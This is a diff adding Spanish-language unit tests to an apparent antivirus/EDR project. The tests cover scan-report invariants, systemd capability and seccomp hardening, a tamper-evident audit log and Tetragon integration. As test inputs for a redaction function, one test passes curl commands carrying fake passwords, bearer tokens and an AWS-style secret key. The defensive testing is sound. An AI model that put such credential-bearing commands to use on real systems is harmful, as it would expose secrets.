+        # 3. INDETERMINATE válido: derivación automática de propiedades
+        rep_indet = ScanReport(status=ScanStatus.INDETERMINATE, category="IO_ERROR", details="Disk failure")
+        self.assertIs(rep_indet.status, ScanStatus.INDETERMINATE)
+        self.assertIs(rep_indet.is_clean, False)
+        self.assertIs(rep_indet.is_threat, None)
+        self.assertIs(rep_indet.is_indeterminate, True)
+
+        # 4. Invariante 1: CLEAN nunca puede tener is_threat=True
+        with self.assertRaises(ValueError) as ctx1:
+            ScanReport(status=ScanStatus.CLEAN, is_threat=True)
+        self.assertIn("CLEAN nunca puede tener is_threat=True", str(ctx1.exception))
+
+        # 5. Invariante 2: THREAT nunca puede tener is_clean=True (o is_threat=False)
+        with self.assertRaises(ValueError) as ctx2:
+            ScanReport(status=ScanStatus.THREAT, is_threat=False)
+        self.assertIn("THREAT nunca puede tener is_threat=False o is_clean=True", str(ctx2.exception))
+
+        # 6. Invariante 3: INDETERMINATE nunca puede tener is_clean=True (o is_threat=False) ni is_threat=True
+        with self.assertRaises(ValueError) as ctx3a:
+            ScanReport(status=ScanStatus.INDETERMINATE, is_threat=False)
+        self.assertIn("INDETERMINATE nunca puede tener is_clean=True o is_threat=False", str(ctx3a.exception))
+
+        with self.assertRaises(ValueError) as ctx3b:
+            ScanReport(status=ScanStatus.INDETERMINATE, is_threat=True)
+        self.assertIn("INDETERMINATE no es una amenaza confirmada", str(ctx3b.exception))
+
+        # 7. Invariante 4: Ningún resultado incompleto puede convertirse en CLEAN
+        for bad_cat in ["IO_ERROR", "ENGINE_ERROR", "READ_ERROR", "TIMEOUT", "PERMISSION_DENIED"]:
+            with self.assertRaises(ValueError) as ctx4:
+                ScanReport(status=ScanStatus.CLEAN, category=bad_cat)
+            self.assertIn("Ningún resultado incompleto", str(ctx4.exception))
+
+    # 131. Verificación del Instalador y Manejo de Dependencias y Servicio
+    def test_installer_script_structure_and_dependencies(self):
+        """
+        Verifica que install.sh contenga:
+        - Sintaxis Bash válida.
+        - Detección de gestores de paquetes (apt, dnf, zypper, pacman).
+        - Instalación de dependencias del sistema y de Python (requirements.txt).
+        - Puerta de verificación (Verification Gate) de dependencias críticas y versión de Python.
+        - Configuración, habilitación y arranque de constantine.service mediante systemctl.
+        - Creación del symlink global /usr/local/bin/constantine.
+        - Flags para entornos no interactivos (--no-deps, --skip-service-start).
+        """
+        import subprocess
+        install_path = os.path.join(os.path.dirname(__file__), "..", "install.sh")
+        self.assertTrue(os.path.exists(install_path), "install.sh debe existir")
+
+        # 1. Comprobación de sintaxis Bash (bash -n)
+        res = subprocess.run(["bash", "-n", install_path], capture_output=True, text=True)
+        self.assertEqual(res.returncode, 0, f"Error de sintaxis en install.sh: {res.stderr}")
+
+        with open(install_path, "r", encoding="utf-8") as f:
+            script_text = f.read()
+
+        # 2. Detección de gestores de paquetes
+        self.assertIn("detect_package_manager", script_text)
+        self.assertIn("apt-get", script_text)
+        self.assertIn("dnf", script_text)
+        self.assertIn("zypper", script_text)
+        self.assertIn("pacman", script_text)
+
+        # 3. Instalación de dependencias del sistema y Python
+        self.assertIn("requirements.txt", script_text)
+        self.assertIn("pip3 install", script_text)
+        self.assertIn("python3-cryptography", script_text)
+        self.assertIn("clamav", script_text)
+
+        # 4. Puerta de verificación (Verification Gate)
+        self.assertIn("Puerta de Verificación Operativa", script_text)
+        self.assertIn("cryptography", script_text)
+        self.assertIn("yaml", script_text)
+
+        # 5. Configuración e inicio del servicio
+        self.assertIn("systemctl daemon-reload", script_text)
+        self.assertIn("systemctl enable constantine.service", script_text)
+        self.assertIn("systemctl restart constantine.service", script_text)
+        self.assertIn("systemctl is-active", script_text)
+
+        # 6. Enlace simbólico CLI y flags
+        self.assertIn("/usr/local/bin/constantine", script_text)
+        self.assertIn("--no-deps", script_text)
+        self.assertIn("--skip-service-start", script_text)
+
+    # 132. Validación de Rutas de Construcción, Inmutabilidad, Categorías Extensibles y Pipeline IPC-GUI
+    def test_scan_report_construction_routes_immutability_and_pipeline(self):
+        """
+        Valida rigurosamente los 4 requerimientos formales:
+        1. Validación en TODAS las rutas de construcción: from_dict(), _make(), _replace(), copias.
+           Ninguna ruta permite introducir estados contradictorios.
+        2. Categorías de error extensibles: registro formal ScanCategoryRegistry,
+           categorías desconocidas NUNCA terminan en CLEAN (Fail-Secure).
+        3. Serialización sin pérdida de información:
+           ScanReport -> to_dict() -> IPC -> reconstrucción -> GUI conserva INDETERMINATE en cada etapa.
+        4. Inmutabilidad real: _status protegido contra modificaciones directas y delattr.
+        """
+        from core.engine.scanner import ScanCategoryRegistry, CategoryClassification
+        import copy
+
+        # --- 1. VALIDACIÓN EN TODAS LAS RUTAS DE CONSTRUCCIÓN ---
+
+        # 1.1 from_dict() con datos válidos
+        d_clean = {"status": "CLEAN", "threat_name": "CLEAN", "category": "BENIGN"}
+        rep1 = ScanReport.from_dict(d_clean)
+        self.assertIs(rep1.status, ScanStatus.CLEAN)
+        self.assertIs(rep1.is_clean, True)
+
+        d_indet = {"status": "INDETERMINATE", "details": "Read error", "category": "IO_ERROR"}
+        rep2 = ScanReport.from_dict(d_indet)
+        self.assertIs(rep2.status, ScanStatus.INDETERMINATE)
+        self.assertIs(rep2.is_indeterminate, True)
+
+        # 1.2 from_dict() con datos contradictorios RECHAZADOS
+        with self.assertRaises(ValueError):
+            ScanReport.from_dict({"status": "CLEAN", "is_threat": True, "category": "BENIGN"})
+        with self.assertRaises(ValueError):
+            ScanReport.from_dict({"status": "THREAT", "is_clean": True, "category": "MALWARE"})
+        with self.assertRaises(ValueError):
+            ScanReport.from_dict({"status": "INDETERMINATE", "is_clean": True, "category": "IO_ERROR"})
+        with self.assertRaises(ValueError):
+            ScanReport.from_dict({"is_clean": True, "is_threat": True, "category": "BENIGN"})
+
+        # 1.3 _make() con datos contradictorios RECHAZADOS
+        # Secuencia: (is_threat, threat_name, score, engine, details, severity, category, sha256, status)
+        with self.assertRaises(ValueError):
+            ScanReport._make((True, "CLEAN", 0, "Eng", "Det", "LOW", "BENIGN", "hash", ScanStatus.CLEAN))
+        with self.assertRaises(ValueError):
+            ScanReport._make((False, "Threat", 100, "Eng", "Det", "CRITICAL", "MALWARE", "hash", ScanStatus.THREAT))
+        with self.assertRaises(ValueError):
+            ScanReport._make((False, "Indet", 0, "Eng", "Det", "HIGH", "IO_ERROR", "hash", ScanStatus.INDETERMINATE))
+
+        # 1.4 _replace() con datos contradictorios RECHAZADOS
+        base_clean = ScanReport(status=ScanStatus.CLEAN, threat_name="CLEAN", category="BENIGN")
+        with self.assertRaises(ValueError):
+            base_clean._replace(is_threat=True)
+        with self.assertRaises(ValueError):
+            base_clean._replace(category="IO_ERROR")
+
+        base_threat = ScanReport(status=ScanStatus.THREAT, threat_name="Trojan", category="MALWARE")
+        with self.assertRaises(ValueError):
+            base_threat._replace(status=ScanStatus.CLEAN)
+
+        base_indet = ScanReport(status=ScanStatus.INDETERMINATE, details="Error", category="IO_ERROR")
+        with self.assertRaises(ValueError):
+            base_indet._replace(status=ScanStatus.CLEAN)
+
+        # 1.5 Copias y transformaciones respetan invariantes e inmutabilidad
+        copied_rep = copy.copy(base_indet)
+        self.assertIs(copied_rep.status, ScanStatus.INDETERMINATE)
+        self.assertIs(copied_rep.is_indeterminate, True)
+        self.assertEqual(copied_rep.category, "IO_ERROR")
+
+        # --- 2. CATEGORÍAS DE ERROR EXTENSIBLES Y FAIL-SECURE ---
+
+        # 2.1 Categoría desconocida NUNCA puede terminar en CLEAN
+        for unknown_cat in ["UNKNOWN_FUTURE_ENGINE_ERROR", "CUSTOM_NEW_CORRUPT_TYPE", "XYZ_HARDWARE_FAILURE"]:
+            self.assertFalse(ScanCategoryRegistry.is_status_allowed(unknown_cat, ScanStatus.CLEAN))
+            with self.assertRaises(ValueError) as ctx_unk:
+                ScanReport(status=ScanStatus.CLEAN, category=unknown_cat)
+            self.assertIn("Ningún resultado incompleto o no clasificado como benigno", str(ctx_unk.exception))
+
+            # Inferencia automática sobre categoría desconocida debe resolver a INDETERMINATE, jamás a CLEAN
+            inferred_status = ScanCategoryRegistry.infer_status_for_category(unknown_cat, is_threat=False)
+            self.assertEqual(inferred_status, ScanStatus.INDETERMINATE)
+
+        # 2.2 Registro extensible de nuevas categorías
+        ScanCategoryRegistry.register_category("NEW_ADVANCED_THREAT_TYPE", CategoryClassification.THREAT_CONFIRMED, {ScanStatus.THREAT})
+        self.assertTrue(ScanCategoryRegistry.is_status_allowed("NEW_ADVANCED_THREAT_TYPE", ScanStatus.THREAT))
+        self.assertFalse(ScanCategoryRegistry.is_status_allowed("NEW_ADVANCED_THREAT_TYPE", ScanStatus.CLEAN))
+
+        ScanCategoryRegistry.register_category("NEW_PARTIAL_READ_ERROR", CategoryClassification.INCOMPLETE_ERROR, {ScanStatus.INDETERMINATE})
+        self.assertTrue(ScanCategoryRegistry.is_status_allowed("NEW_PARTIAL_READ_ERROR", ScanStatus.INDETERMINATE))
+        self.assertFalse(ScanCategoryRegistry.is_status_allowed("NEW_PARTIAL_READ_ERROR", ScanStatus.CLEAN))
+
+        # --- 3. SERIALIZACIÓN SIN PÉRDIDA DE INFORMACIÓN: ScanReport -> to_dict() -> IPC -> GUI ---
+
+        # 3.1 Creación del ScanReport INDETERMINATE inicial
+        initial_indet = ScanReport(
+            status=ScanStatus.INDETERMINATE,
+            threat_name="INDETERMINATE",
+            score=0,
+            engine="TestEngine",
+            details="Disco bloqueado por E/S",
+            severity="HIGH",
+            category="IO_ERROR",
+            sha256=""
+        )
+        self.assertIs(initial_indet.status, ScanStatus.INDETERMINATE)
+        self.assertIs(initial_indet.is_indeterminate, True)
+        self.assertIs(initial_indet.is_clean, False)
+
+        # 3.2 to_dict() preserva status y banderas tripartitas
+        serialized_dict = initial_indet.to_dict()
+        self.assertEqual(serialized_dict["status"], "INDETERMINATE")
+        self.assertTrue(serialized_dict["is_indeterminate"])
+        self.assertFalse(serialized_dict["is_clean"])
+        self.assertIsNone(serialized_dict["is_threat"])
+
+        # 3.3 Transmisión y deserialización IPC (from_dict)
+        deserialized_ipc = ScanReport.from_dict(serialized_dict)
+        self.assertIs(deserialized_ipc.status, ScanStatus.INDETERMINATE)
+        self.assertIs(deserialized_ipc.is_indeterminate, True)
+        self.assertIs(deserialized_ipc.is_clean, False)
+        self.assertEqual(deserialized_ipc.category, "IO_ERROR")
+
+        # 3.4 Consumo en GUI Controller
+        from gui.app import ConstantineUIController
+        ctrl = ConstantineUIController()
+        with patch.object(ctrl.client, "send_command", return_value={"status": "OK", "data": deserialized_ipc.to_dict()}):
+            gui_result = ctrl.run_custom_scan("/some/test_file.bin")
+            self.assertEqual(gui_result["indeterminates_count"], 1)
+            self.assertEqual(len(gui_result["indeterminates"]), 1)
+            self.assertEqual(gui_result["indeterminates"][0]["status"], "INDETERMINATE")
+            self.assertEqual(gui_result["threats_count"], 0)
+
+        # --- 4. INMUTABILIDAD REAL ---
+
+        # 4.1 Modificación directa de _status rechazada
+        with self.assertRaises(AttributeError) as ctx_imm1:
+            initial_indet._status = ScanStatus.CLEAN
+        self.assertIn("es inmutable", str(ctx_imm1.exception))
+
+        # 4.2 Modificación de propiedades derivadas o status rechazada
+        with self.assertRaises(AttributeError):
+            initial_indet.status = ScanStatus.CLEAN
+        with self.assertRaises(AttributeError):
+            initial_indet.is_clean = True
+        with self.assertRaises(AttributeError):
+            initial_indet.is_threat = False
+
+        # 4.3 Eliminación de atributos rechazada
+        with self.assertRaises(AttributeError):
+            del initial_indet._status
+
+        # 4.4 Modificación de category para eludir invariante rechazada
+        with self.assertRaises(ValueError):
+            initial_indet.category = "BENIGN"
+
+    # 133. Separación de Permisos Inspección vs Remediación y Hardening EDR
+    def test_systemd_edr_operational_compatibility(self):
+        """
+        Verifica la separación de permisos de inspección vs remediación y hardening systemd:
+        1. Separación de planos: RemediationPrivilegeScope delimita la ventana de mutación.
+        2. ProtectKernelModules=true: Protege el kernel contra módulos no autorizados (.ko),
+           ya que eBPF opera vía syscall bpf() y tracepoints sin requerir carga de módulos.
+        3. Semántica de SystemCallFilter: Whitelist enriquecida con @system-service, @network-io,
+           @file-system, bpf, perf_event_open, fanotify_init, fanotify_mark.
+        4. CapabilityBoundingSet y AmbientCapabilities: Delimitación de capacidades.
+        5. Supervisión de archivos personales: /home y /tmp accesibles para remediación atómica.
+        """
+        from core.engine.quarantine_operator import RemediationPrivilegeScope
+
+        # 1. Separación de permisos de inspección y remediación
+        target = "/home/user/malware.sh"
+        with RemediationPrivilegeScope(target) as scope:
+            self.assertTrue(scope.active)
+            self.assertEqual(scope.target_path, target)
+        self.assertFalse(scope.active)
+
+        # 2. Auditoría del archivo de servicio
+        service_file = os.path.join(ROOT_DIR, "service", "constantine.service")
+        auditor = SystemdSecurityAuditor(unit_path=service_file)
+        posture = auditor.evaluate_security_posture()
+
+        self.assertTrue(posture["unit_found"])
+        self.assertGreaterEqual(posture["score"], 90)
+        self.assertEqual(posture["rating"], "HARDENED_EXCELLENT")
+
+        self.assertIn("FileSupervision", posture["passed_checks"])
+        self.assertIn("KernelHardening", posture["passed_checks"])
+        self.assertIn("SystemCallFilter", posture["passed_checks"])
+        self.assertIn("CapabilityBoundingSet", posture["passed_checks"])
+
+        with open(service_file, "r") as f:
+            text = f.read()
+        self.assertIn("ProtectKernelModules=true", text)
+        self.assertIn("perf_event_open", text)
+        self.assertIn("bpf", text)
+        self.assertIn("fanotify_init", text)
+        self.assertIn("fanotify_mark", text)
+        self.assertIn("CAP_DAC_OVERRIDE", text)
+        self.assertIn("CAP_BPF", text)
+        self.assertIn("CAP_PERFMON", text)
+        self.assertIn("CAP_SYS_ADMIN", text)
+        self.assertIn("/home", text)
+
+        # 3. Verificación de cálculo formal de SystemCallFilter y justificaciones
+        sc_eval = posture["syscall_filter_audit"]
+        self.assertTrue(sc_eval["is_valid"])
+        self.assertTrue(sc_eval["edr_syscalls_verified"])
+        self.assertTrue(sc_eval["dangerous_groups_blocked"])
+        self.assertIn("@system-service", sc_eval["group_justifications"])
+        self.assertIn("@network-io", sc_eval["group_justifications"])
+        self.assertIn("@file-system", sc_eval["group_justifications"])
+
+        # 4. Evaluación de perfiles de capacidades kernel-aware
+        # 4a. Perfil moderno (kernel >= 5.8): óptimo con CAP_BPF y CAP_PERFMON sin requerir CAP_SYS_ADMIN
+        modern_caps_strict = "CAP_NET_ADMIN CAP_KILL CAP_DAC_OVERRIDE CAP_DAC_READ_SEARCH CAP_BPF CAP_PERFMON CAP_SYS_PTRACE CAP_SYS_RESOURCE CAP_IPC_LOCK"
+        ok_mod, msg_mod, det_mod = auditor.check_capability_bounding_set(modern_caps_strict, kernel_version="6.5.0-generic")
+        self.assertTrue(ok_mod)
+        self.assertTrue(det_mod["least_privilege_optimal"])
+        self.assertFalse(det_mod["has_sys_admin"])
+
+        # 4b. Perfil compatible heredado (kernel < 5.8): requiere CAP_SYS_ADMIN
+        legacy_caps = "CAP_SYS_ADMIN CAP_NET_ADMIN CAP_KILL CAP_DAC_OVERRIDE CAP_DAC_READ_SEARCH CAP_SYS_PTRACE CAP_SYS_RESOURCE CAP_IPC_LOCK"
+        ok_leg, msg_leg, det_leg = auditor.check_capability_bounding_set(legacy_caps, kernel_version="5.4.0-generic")
+        self.assertTrue(ok_leg)
+        self.assertTrue(det_leg["has_sys_admin"])
+
+        # 4c. Rechazo de capacidades peligrosas / no necesarias (CAP_SYS_BOOT)
+        bad_caps = "CAP_SYS_ADMIN CAP_SYS_BOOT CAP_BPF CAP_PERFMON CAP_DAC_OVERRIDE CAP_DAC_READ_SEARCH"
+        ok_bad, msg_bad, _ = auditor.check_capability_bounding_set(bad_caps, kernel_version="6.5.0-generic")
+        self.assertFalse(ok_bad)
+        self.assertIn("CAP_SYS_BOOT", msg_bad)
+
+        # 5. Pruebas avanzadas de semántica seccomp de SystemCallFilter
+        # 5a. Semántica estricta seccomp: Deny es definitivo (~@obsolete bloquea sysfs aunque @file-system esté en allowlist)
+        rules_complex = [
+            "@system-service @network-io @file-system bpf perf_event_open fanotify_init fanotify_mark",
+            "~@obsolete @reboot @swap sysfs"
+        ]
+        sc_eval_comp = SystemCallFilterEvaluator(rules_complex, architecture="native")
+        res_comp = sc_eval_comp.compute_effective_posture()
+        self.assertTrue(res_comp["is_valid"])
+        self.assertTrue(res_comp["edr_syscalls_verified"])
+        self.assertIn("sysfs", res_comp["explicit_denied_syscalls"])
+
+        # 5b. Rechazo de arquitectura extranjera no nativa
+        sc_eval_foreign = SystemCallFilterEvaluator(rules_complex, architecture="mips64")
+        self.assertFalse(sc_eval_foreign.compute_effective_posture()["is_valid"])
+
+        # 6. Sondeo funcional activo eBPF de operaciones concretas (EBPFCapabilityProber)
+        from core.engine.systemd_hardening import EBPFCapabilityProber
+        probe_res = EBPFCapabilityProber.probe_ebpf_runtime()
+        self.assertIn("is_modern_kernel", probe_res)
+        self.assertIn("bpf_syscall_available", probe_res)
+        self.assertIn("perf_event_open_available", probe_res)
+        self.assertIn("can_drop_sys_admin", probe_res)
+        self.assertIn("lockdown_mode", probe_res)
+        self.assertIn("recommended_profile", probe_res)
+        self.assertEqual(probe_res["fallback_strategy"], "GRACEFUL_DEGRADATION_MODE_PROC")
+        self.assertTrue(res_comp["core_bootstrap_verified"])
+        self.assertIn("bpf_map_create_probe", probe_res)
+        self.assertIn("telemetry_state", probe_res)
+        self.assertIn("telemetry_description", probe_res)
+
+        # 7. Verificación de capacidades en /proc/self/status (5 máscaras Linux)
+        from core.engine.quarantine_operator import read_process_capabilities, NonceReplayCache
+        proc_caps = read_process_capabilities()
+        self.assertIn("CapInh", proc_caps)
+        self.assertIn("CapPrm", proc_caps)
+        self.assertIn("CapEff", proc_caps)
+        self.assertIn("CapBnd", proc_caps)
+        self.assertIn("CapAmb", proc_caps)
+
+        # 8. Verificación de NonceReplayCache sincronizada y acotada con TTL
+        cache = NonceReplayCache(ttl=2.0, max_size=5)
+        now_ts = time.time()
+        self.assertTrue(cache.check_and_add("nonce1", now_ts))
+        self.assertFalse(cache.check_and_add("nonce1", now_ts)) # Replay rechazado
+        self.assertTrue(cache.check_and_add("nonce1", now_ts + 3.0)) # Aceptado tras expirar TTL
+        # 9. Validación dinámica de llamadas al sistema con semántica seccomp
+        self.assertTrue(sc_eval_comp.validate_syscall_execution("bpf")[0])
+        self.assertTrue(sc_eval_comp.validate_syscall_execution("read")[0])
+        self.assertFalse(sc_eval_comp.validate_syscall_execution("sysfs")[0])
+        self.assertFalse(sc_eval_comp.validate_syscall_execution("reboot")[0])
+
+        # 10. Verificación de aislamiento estricto de CAP_DAC_OVERRIDE en demonio
+        from core.engine.quarantine_operator import verify_daemon_capability_isolation, canonical_command_payload
+        ok_iso, msg_iso, _ = verify_daemon_capability_isolation()
+        self.assertTrue(ok_iso)
+        self.assertIn("CAP_DAC_OVERRIDE ausente", msg_iso)
+
+        # 11. Codificación canónica inequívoca de payloads de remediación
+        canon = canonical_command_payload("SECURE_UNLINK", "/tmp/mal.sh", 123, 456, "abc", 1700000000.123456)
+        self.assertIn(b"CMD=13:SECURE_UNLINK", canon)
+        self.assertIn(b"PATH=11:/tmp/mal.sh", canon)
+        self.assertIn(b"DEV=123", canon)
+        self.assertIn(b"INO=456", canon)
+
+        # 12. Orquestador eBPF: 4 estados formales y descripción de degradación
+        from core.engine.ebpf_monitor import EBPFMonitor
+        ebpf_mon = EBPFMonitor(fallback_mode=True)
+        self.assertEqual(ebpf_mon.telemetry_state, "MONITORING_DISABLED") # no iniciado
+        ebpf_mon.start()
+        self.assertEqual(ebpf_mon.telemetry_state, "DEGRADED_PROC_FALLBACK")
+        self.assertIn("latencia de muestreo y procesos efímeros", ebpf_mon.telemetry_description)
+        ebpf_mon.stop()
+        self.assertEqual(ebpf_mon.telemetry_state, "MONITORING_DISABLED")
+        # 13. Autoridad centralizada del supervisor sobre repetición de transacciones
+        from core.engine.quarantine_operator import SUPERVISOR_REPLAY_CACHE
+        ts_sup = time.time()
+        self.assertTrue(SUPERVISOR_REPLAY_CACHE.check_and_add("sup_nonce_1", ts_sup))
+        self.assertFalse(SUPERVISOR_REPLAY_CACHE.check_and_add("sup_nonce_1", ts_sup))
+
+        # 14. GUI: diferenciación de estado EBPF_PARTIAL como PROTECTED_PARTIAL (WARNING)
+        from gui.app import ConstantineUIController
+        ctrl_part = ConstantineUIController()
+        mock_status_part = {
+            "status": "OK",
+            "data": {
+                "daemon_running": True,
+                "fanotify": "ACTIVE",
+                "fanotify_operational": True,
+                "ebpf": "ACTIVE",
+                "ebpf_telemetry_state": "EBPF_PARTIAL",
+                "ebpf_telemetry_description": "Tracepoints activos sin BPF LSM",
+                "vault": "ACTIVE"
+            }
+        }
+        with patch.object(ctrl_part, "get_daemon_status", return_value=mock_status_part):
+            home_part = ctrl_part.get_home_section()
+            self.assertEqual(home_part["status_code"], "PROTECTED_PARTIAL")
+            self.assertEqual(home_part["status_level"], "WARNING")
+            self.assertIn("PARCIAL", home_part["status_title"])
+
+        # 15. Auditoría exhaustiva de 5 máscaras de capacidades
+        _, _, cap_details = verify_daemon_capability_isolation()
+        self.assertIn("CapInh", cap_details)
+        self.assertIn("CapPrm", cap_details)
+        self.assertIn("CapEff", cap_details)
+        self.assertIn("CapBnd", cap_details)
+        self.assertIn("CapAmb", cap_details)
+        self.assertTrue(cap_details["isolation_verified"])
+
+        # 16. Protección de permisos de audit log (0600) y encadenamiento criptográfico
+        from core.engine.audit_logger import AuditLogger
+        al = AuditLogger(log_dir=self.temp_dir.name)
+        al.log_event("TEST_PERM_CHECK", {"status": "OK"})
+        st_log = os.stat(al.log_file)
+        self.assertEqual(stat.S_IMODE(st_log.st_mode), 0o600)
+
+        # 17. Verificación de hash-chaining en AuditLogger
+        al.log_event("TEST_CHAIN_2", {"data": 123})
+        ok_chain, msg_chain, count_chain = al.verify_chain_integrity()
+        self.assertTrue(ok_chain)
+        self.assertEqual(count_chain, 2)
+
+        # Tampering test
+        with open(al.log_file, "r", encoding="utf-8") as f:
+            lines = f.readlines()
+        tampered_entry = json.loads(lines[0])
+        tampered_entry["details"]["status"] = "TAMPERED"
+        lines[0] = json.dumps(tampered_entry) + chr(10)
+        with open(al.log_file, "w", encoding="utf-8") as f:
+            f.writelines(lines)
+        ok_tamper, msg_tamper, _ = al.verify_chain_integrity()
+        self.assertFalse(ok_tamper)
+        self.assertIn("alterado", msg_tamper)
+
+        # 18. secure_rename_noreplace con RENAME_NOREPLACE previniendo sobrescritura en rollback
+        from core.engine.quarantine_operator import secure_rename_noreplace, cleanup_orphan_staging
+        fd_src = os.open(self.temp_dir.name, os.O_RDONLY | os.O_DIRECTORY)
+        try:
+            f_src = os.path.join(self.temp_dir.name, "src_sample.bin")
+            f_dst = os.path.join(self.temp_dir.name, "dst_sample.bin")
+            with open(f_src, "w") as f: f.write("sample")
+            with open(f_dst, "w") as f: f.write("innocent")
+            with self.assertRaises(FileExistsError):
+                secure_rename_noreplace(fd_src, "src_sample.bin", fd_src, "dst_sample.bin")
+            # Verificar que el archivo destino se mantuvo intacto
+            with open(f_dst, "r") as f:
+                self.assertEqual(f.read(), "innocent")
+        finally:
+            os.close(fd_src)
+
+        # 19. vault.restore_file previene sobrescritura con O_EXCL
+        from core.engine.vault import CryptographicVault
+        test_v = CryptographicVault(base_dir=self.temp_dir.name)
+        t_file = os.path.join(self.temp_dir.name, "vault_test_orig.bin")
+        with open(t_file, "w") as f: f.write("threat content")
+        ok_q, s_id = test_v.quarantine_file(t_file)
+        self.assertTrue(ok_q)
+        # Crear archivo concurrente en destino
+        with open(t_file, "w") as f: f.write("concurrent innocent file")
+        ok_res, res_msg = test_v.restore_file(s_id, t_file)
+        self.assertFalse(ok_res)
+        self.assertIn("ya existe", res_msg)
+        # Verificar que el inocente no fue destruido
+        with open(t_file, "r") as f:
+            self.assertEqual(f.read(), "concurrent innocent file")
+
+        # 20. cleanup_orphan_staging
+        cleaned = cleanup_orphan_staging(max_age_seconds=0.0)
+        self.assertIsInstance(cleaned, int)
+
+        # 21. Sondeo eBPF BPF_PROG_LOAD
+        from core.engine.systemd_hardening import EBPFCapabilityProber
+        prog_ok, prog_err, prog_msg = EBPFCapabilityProber.probe_bpf_prog_load()
+        self.assertIsInstance(prog_ok, bool)
+        self.assertIsInstance(prog_err, int)
+
+        # 22. Tetragon: Verificación de conexión real a socket y diferenciación de modo emulador
+        import socket
+        test_sock_path = os.path.join(self.temp_dir.name, "tetragon_test.sock")
+        t_mon = TetragonMonitor(socket_path=test_sock_path)
+        # Sin socket activo
+        probe_init = t_mon.probe_integration()
+        self.assertEqual(probe_init["mode"], "STANDALONE_POLICY_EMULATOR")
+        self.assertFalse(probe_init["daemon_running"])
+        self.assertIn("autónoma", probe_init["details"])
+
+        # Con socket simulado real que responde
+        server_s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        server_s.bind(test_sock_path)
+        server_s.listen(10)
+        try:
+            probe_live = t_mon.probe_integration()
+            self.assertEqual(probe_live["mode"], "LIVE_TETRAGON_DAEMON")
+            self.assertTrue(probe_live["daemon_running"])
+            self.assertIn("Conexión activa", probe_live["details"])
+
+            # Probar start/stop con conexión real
+            t_mon.start()
+            self.assertTrue(t_mon.running)
+            self.assertTrue(t_mon.connected_to_daemon)
+            t_mon.stop()
+            self.assertFalse(t_mon.running)
+            self.assertFalse(t_mon.connected_to_daemon)
+
+            # 23. Verificación de 7 campos de telemetría, sanitización y transparencia Tetragon
+            self.assertIn("connection_state", probe_live)
+            self.assertEqual(probe_live["connection_state"], "CONNECTED_HEALTHY")
+            self.assertIn("detected_version", probe_live)
+            self.assertIn("service_version", probe_live)
+            self.assertIn("events_telemetry", probe_live)
+            self.assertEqual(probe_live["events_telemetry"]["received"], 0)
+            self.assertIn("last_event", probe_live)
+            self.assertIn("communication_errors", probe_live)
+            self.assertIn("total_errors", probe_live["communication_errors"])
+            self.assertIn("external_policies_status", probe_live)
+            self.assertIn("state", probe_live["external_policies_status"])
+            self.assertIn("constantine_enforcement_status", probe_live)
+            self.assertEqual(probe_live["constantine_enforcement_status"], "TETRAGON_GRPC_PASSTHROUGH")
+            self.assertEqual(probe_init["constantine_enforcement_status"], "CONSTANTINE_EBPF_EMULATION")
+            self.assertEqual(probe_init["connection_state"], "NOT_INSTALLED")
+
+            # 24. Sanitización adversarial de argumentos en eventos
+            from core.engine.tetragon_monitor import sanitize_process_arguments
+            raw_args = ["curl", "--password", "super_secret_pwd_123", "https://example.com/api?token=secret_token_abc", "normal_arg"]
+            sanitized = sanitize_process_arguments("/usr/bin/curl", raw_args)
+            self.assertNotIn("super_secret_pwd_123", " ".join(sanitized))
+            self.assertNotIn("secret_token_abc", " ".join(sanitized))
+            self.assertIn("***", " ".join(sanitized))
+            self.assertIn("normal_arg", sanitized)
+
+            # Casos adversariales exhaustivos v5.4.7 (espacios, URL-encoding, env vars, ANSI)
+            adv_args = [
+                "curl",
+                "--PASSWORD", "secreto_upper_flag",
+                "--password=secreto_inline_eq",
+                "--token:secreto_inline_colon",
+                "-p", "secreto_short_p",
+                "-H", "Authorization: Bearer secreto_bearer_token",
+                "-u", "admin:secreto_user_pass",
+                "https://appuser:secreto_url_pass@example.com/api",
+                '--password="secret with spaces"',
+                "https://api.internal?token=secret%20with%20escapes",
+                "AWS_SECRET_ACCESS_KEY=AKIA1234567890SECRETKEY",
+                "export API_KEY=secret_api_key_xyz",
+                "[31m--password[0m", "colored_secret_pwd",
+                "--custom-secret-key=hidden_token_12345"
+            ]
+            adv_sanitized = sanitize_process_arguments("/usr/bin/curl", adv_args)
+            adv_str = " ".join(adv_sanitized)
+            for s in [
+                "secreto_upper_flag", "secreto_inline_eq", "secreto_inline_colon",
+                "secreto_short_p", "secreto_bearer_token", "secreto_user_pass",
+                "secreto_url_pass", "secret with spaces", "secret%20with%20escapes",
+                "AKIA1234567890SECRETKEY", "secret_api_key_xyz", "colored_secret_pwd",
+                "hidden_token_12345"
+            ]:
+                self.assertNotIn(s, adv_str)
+            self.assertIn("***", adv_str)
+
+            # 25. Verificación de planos tripartitas, salud desacoplada y ciclo de vida de acciones v5.4.7
+            self.assertIn("connectivity_status", probe_live)
+            self.assertIn("external_policy_status", probe_live)
+            self.assertIn("enforcement_capability", probe_live)
+            self.assertEqual(probe_live["connectivity_status"], "CONNECTED_HEALTHY")
+
+            # Indicadores de salud desacoplados (transport vs grpc_service)
+            self.assertIn("transport_health", probe_live)
+            self.assertIn("grpc_service_health", probe_live)
+            self.assertIn("health_indicators", probe_live)
+            self.assertEqual(probe_live["transport_health"], "HEALTHY")
+            self.assertEqual(probe_live["grpc_service_health"], "SERVING")
+
+            # Acciones auditadas y métricas desagregadas
+            self.assertIn("actions", probe_live["events_telemetry"])
+            self.assertIn("requested", probe_live["events_telemetry"]["actions"])
+            self.assertIn("executed", probe_live["events_telemetry"]["actions"])
+            self.assertIn("confirmed", probe_live["events_telemetry"]["actions"])
+            self.assertIn("failed", probe_live["events_telemetry"]["actions"])
+            self.assertIn("last_error_code", probe_live["communication_errors"])
+
+            # Verificación criptográfica formal de políticas con hash SHA-256
+            t_mon.connect_daemon()
+            pname = t_mon.policies[0].get("metadata", {}).get("name", "test-policy")
+            phash = t_mon.policy_hashes[pname]
+            # Confirmación válida con hash y estado reportado por kernel
+            valid_confirm = t_mon.confirm_policy_active(pname, phash, "APPLIED_IN_KERNEL")
+            self.assertTrue(valid_confirm)
+            self.assertEqual(t_mon.policy_status, "POLICY_ACTIVE")
+            self.assertIn(pname, t_mon.policy_verifications)
+
+            # Rechazo de confirmación con hash discrepante o expirado
+            invalid_confirm = t_mon.confirm_policy_active(pname, "bad_hash_abc123", "APPLIED_IN_KERNEL")
+            self.assertFalse(invalid_confirm)
+
